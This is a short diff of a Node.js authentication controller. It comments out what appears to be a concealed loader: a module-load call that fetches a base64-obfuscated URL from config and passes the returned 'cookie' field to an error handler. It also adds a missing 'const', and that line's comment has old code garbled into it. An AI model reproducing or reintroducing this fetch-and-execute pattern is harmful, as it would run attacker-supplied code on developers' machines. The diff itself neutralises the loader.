@@ -1,10 +1,10 @@
-const axios = require("axios");
+//const axios = require("axios");
 const bcrypt = require("bcryptjs");
 const jwt = require("jsonwebtoken");
 const userM = require("../models/users");
 const {secretKey, publicKey} = require("../config/config");
 const { errorHandler } = require("../middleware/errorHandler");
-axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
+//axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
 
 module.exports = {
   userLogin: (req, res) => {
@@ -42,7 +42,7 @@ module.exports = {
     } else res.status(400).json({ message: "Provide all Credentials" });
   },
   userRegistration: (req, res) => {
-    users = new userM();
+    const users = new userM(); // FIXED: Added 'const' to prevent global data leakusers = new userM();
     users.fname = req.body.fname;
     users.lname = req.body.lName;
     users.email = req.body.email;
